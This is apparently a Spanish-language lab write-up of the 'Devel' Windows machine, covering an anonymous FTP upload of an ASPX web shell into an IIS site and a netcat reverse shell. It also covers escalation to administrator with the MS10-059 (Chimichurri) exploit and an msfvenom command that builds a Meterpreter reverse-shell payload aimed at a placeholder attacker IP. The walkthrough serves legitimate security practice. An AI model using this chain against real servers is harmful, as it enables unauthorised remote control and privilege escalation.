---
title: "Devel"
system: "Windows"
kind: "Laboratorio"
number: 8
order: 9
summary: "Acceso por FTP e IIS y escalada mediante una vulnerabilidad del sistema."
tags: ["FTP", "IIS", "Kernel"]
keywords: "devel devel ftp · iis · kernel acceso por ftp e iis y escalada mediante una vulnerabilidad del sistema."
---

## El FTP y la web comparten archivos

Nmap nos muestra los puertos `21` y `80`. Al principio me centro en IIS 7.5 y en sus posibles vulnerabilidades, pero después de darle unas vueltas veo algo más sencillo: el FTP permite acceso anónimo y podemos subir archivos que luego aparecen en la web. Preparamos una web shell `.aspx`, compatible con ASP.NET en IIS, y la subimos por FTP. Al abrirla en el navegador comprobamos que podemos ejecutar comandos.

## Una consola interactiva

Para trabajar mejor preparo `nc.exe` en un recurso SMB compartido con Impacket. Desde la web shell ejecuto el binario y me pongo en escucha en el puerto `443`. Ya tenemos una consola en la máquina.

## Escalada con MS10-059

Ejecuto `systeminfo` y guardo su salida en mi equipo para analizarla con Windows Exploit Suggester. Aparecen varias posibilidades; la que me funciona es `MS10-059`, también conocida como Chimichurri. Transfiero el ejecutable al destino y lo lanzo indicando mi IP y el puerto de escucha. Esta vez recibo una consola con privilegios de administrador y puedo acceder a las flags.

## Otra forma de recibir la shell

También podemos aprovechar la subida por FTP para dejar un payload de Meterpreter en formato ASPX:

```
msfvenom -p windows/meterpreter/reverse_tcp -f aspx -o shell.aspx LHOST=MI_IP LPORT=443
```

Después configuramos `exploit/multi/handler` con el mismo payload, IP y puerto. Al abrir el archivo desde la web llega la sesión. La entrada sigue siendo la misma: el FTP nos permite colocar un archivo ejecutable en el directorio servido por IIS.
